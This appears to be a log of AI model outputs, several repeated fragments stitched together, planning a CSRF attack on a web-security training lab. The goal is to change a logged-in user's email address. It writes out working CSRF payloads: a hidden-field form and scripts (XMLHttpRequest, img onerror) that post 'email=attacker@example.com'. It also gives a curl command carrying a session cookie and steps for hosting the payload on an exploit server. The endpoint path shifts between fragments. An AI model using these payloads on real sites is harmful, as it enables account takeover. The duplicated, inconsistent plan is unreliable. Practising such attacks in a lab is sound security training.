The goal is to craft and use a CSRF attack to change the email address of the logged-in user and successfully solve the lab.\n\n### Step 2 \u2013 Access and Prepare:\n**Objective:** Connect to the lab and verify browsing capabilities using the provided cookies.\n\nWe'll begin with confirming access by sending a simple HTTP request, setting the specified cookies, and seeing if we retrieve the expected HTML structure. \n\n**Command:**\n```bash\ncurl -b 'SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIAGwtDAn3MkGi8hEFDDgQlspvB%2Fq9%2BhJWv8GGTxnRDcVQdcrwQJK95bQczsKQT42fmNBO%2BMO86wv23szOZ%2FOnAHXC5IyF2xjtlF3lrvHHcJfmj6K5ezyrNs4l9b2uiZ7gzFSfmj1NEb9cvpD%2FO5s8W' 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/'\n```\n\n### Step 3 \u2013 Identify Vulnerable Parameter:\nThe description suggests that the likely vulnerable part is the email change functionality. We'll need to identify the endpoint and the specifics of the form parameters used for changing the email.\n\n### Step 4 \u2013 Payloads to Test:\nGiven the context, CSRF vulnerabilities often involve posting data like form submissions. We'll create CSRF payloads assuming a typical POST request to an endpoint used for changing emails.\n\n**Payload 1: Basic CSRF Form**\n```html\n<form action=\"https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/account/change-email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Script-Based CSRF**\n```html\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/account/change-email', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('email=attacker@example.com');\n</script>\n```\n\n### Step 5 \u2013 Execute and Observe:\nUpload one of these payloads to an exploit server or inject directly into a page the victim would visit.\n\n**Execution:**\nUpload the crafted HTML to the exploit server and navigate to that link as an authorized user to simulate the attack.\n\n### Step 6 \u2013 Result:\nWe will check the account settings of the user to confirm if the email changed to `attacker@example.com`. If successful, the lab webpage would give a \"Congratulations, you solved the lab!\" message.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** The form field used for the `POST` request to change the email.\n- **Working Payload:** The simple HTML form or script that auto-submits the change email request without user consent. Both should work if there's no CSRF token validation in place.\n\nBy following these steps, we should be able to demonstrate the CSRF attack and fulfill the lab's requirements.

Here are two payloads we will test:\n\n**Payload 1: Simple CSRF Form**\n```html\n<form action=\"https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/my-account/change-email\" method=\"POST\" enctype=\"application/x-www-form-urlencoded\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Automated CSRF Script**\n```html\n<img src=\"#\" onerror=\"\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/my-account/change-email', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('email=attacker@example.com');\n\">\n```\n\n### Step 5 \u2013 Execute and Observe:\nNow, we'll upload these payloads to the provided exploit server and access them through a web browser to test their effectiveness. We'll perform these steps:\n\n1. **Upload the Payload to the Exploit Server:**\n   - Visit https://exploit-0a6f00ae0428c6ea80fc0c3401c80073.exploit-server.net/ and upload the payload under a file, such as `csrf-payload.html`.\n\n2. **Trigger the Payload:**\n   - With an authenticated session, visit the uploaded URL.\n   - Check if there are any changes or success messages from the lab server that confirm the email change.\n\n### Step 6 \u2013 Result:\nTo see if any payload was successful, we will look for a \"Congratulations, you solved the lab!\" message on the exploit server and an email address change confirmation.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** Email parameter in the POST request of the email change functionality.\n- **Working Payload:** Likely the simple HTML form or the automated script, depending on which execution method is supported by the lab environment.\n\nWe will continue by implementing the payload upload and execution on the exploit server, keeping an eye on potential email changes or completed lab messages."}

The goal is to craft and use a CSRF attack to change the email address of the logged-in user and successfully solve the lab.\n\n### Step 2 \u2013 Access and Prepare:\n**Objective:** Connect to the lab and verify browsing capabilities using the provided cookies.\n\nWe'll begin with confirming access by sending a simple HTTP request, setting the specified cookies, and seeing if we retrieve the expected HTML structure. \n\n**Command:**\n```bash\ncurl -b 'SessionId=CfDJ8O%2Ftjg2RtKNJpnZ2rqfooZIAGwtDAn3MkGi8hEFDDgQlspvB%2Fq9%2BhJWv8GGTxnRDcVQdcrwQJK95bQczsKQT42fmNBO%2BMO86wv23szOZ%2FOnAHXC5IyF2xjtlF3lrvHHcJfmj6K5ezyrNs4l9b2uiZ7gzFSfmj1NEb9cvpD%2FO5s8W' 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/'\n```\n\n### Step 3 \u2013 Identify Vulnerable Parameter:\nThe description suggests that the likely vulnerable part is the email change functionality. We'll need to identify the endpoint and the specifics of the form parameters used for changing the email.\n\n### Step 4 \u2013 Payloads to Test:\nGiven the context, CSRF vulnerabilities often involve posting data like form submissions. We'll create CSRF payloads assuming a typical POST request to an endpoint used for changing emails.\n\n**Payload 1: Basic CSRF Form**\n```html\n<form action=\"https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/account/change-email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Script-Based CSRF**\n```html\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/account/change-email', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('email=attacker@example.com');\n</script>\n```\n\n### Step 5 \u2013 Execute and Observe:\nUpload one of these payloads to an exploit server or inject directly into a page the victim would visit.\n\n**Execution:**\nUpload the crafted HTML to the exploit server and navigate to that link as an authorized user to simulate the attack.\n\n### Step 6 \u2013 Result:\nWe will check the account settings of the user to confirm if the email changed to `attacker@example.com`. If successful, the lab webpage would give a \"Congratulations, you solved the lab!\" message.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** The form field used for the `POST` request to change the email.\n- **Working Payload:** The simple HTML form or script that auto-submits the change email request without user consent. Both should work if there's no CSRF token validation in place.\n\nBy following these steps, we should be able to demonstrate the CSRF attack and fulfill the lab's requirements.

Given that we have access to account settings, we're looking for an endpoint like `/account/change-email` that would accept a `POST` request to change the email.\n\n### Step 4 \u2013 Payloads to Test:\nBased on usual CSRF patterns, we'll focus on HTML forms that can be submitted automatically when loaded in a browser. Here are two payloads we will test:\n\n**Payload 1: Simple CSRF Form**\n```html\n<form action=\"https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/my-account/change-email\" method=\"POST\" enctype=\"application/x-www-form-urlencoded\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Automated CSRF Script**\n```html\n<img src=\"#\" onerror=\"\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/my-account/change-email', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('email=attacker@example.com');\n\">\n```\n\n### Step 5 \u2013 Execute and Observe:\nNow, we'll upload these payloads to the provided exploit server and access them through a web browser to test their effectiveness. We'll perform these steps:\n\n1. **Upload the Payload to the Exploit Server:**\n   - Visit https://exploit-0a6f00ae0428c6ea80fc0c3401c80073.exploit-server.net/ and upload the payload under a file, such as `csrf-payload.html`.\n\n2. **Trigger the Payload:**\n   - With an authenticated session, visit the uploaded URL.\n   - Check if there are any changes or success messages from the lab server that confirm the email change.\n\n### Step 6 \u2013 Result:\nTo see if any payload was successful, we will look for a \"Congratulations, you solved the lab!\" message on the exploit server and an email address change confirmation.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** Email parameter in the POST request of the email change functionality.\n- **Working Payload:** Likely the simple HTML form or the automated script, depending on which execution method is supported by the lab environment.\n\nWe will continue by implementing the payload upload and execution on the exploit server, keeping an eye on potential email changes or completed lab messages.", "tool_calls": []}, "finish_reason": "stop"}], "usage": {"prompt_tokens": 7674, "completion_tokens": 557, "total_tokens": 8231}, "cost": {"interaction_cost": 0.0, "total_cost": 0.0}, "timing": {"active_seconds": 38.0, "idle_seconds": 193.0}, "timestamp_iso": "2025-07-22T14:12:00.738842+02:00"}
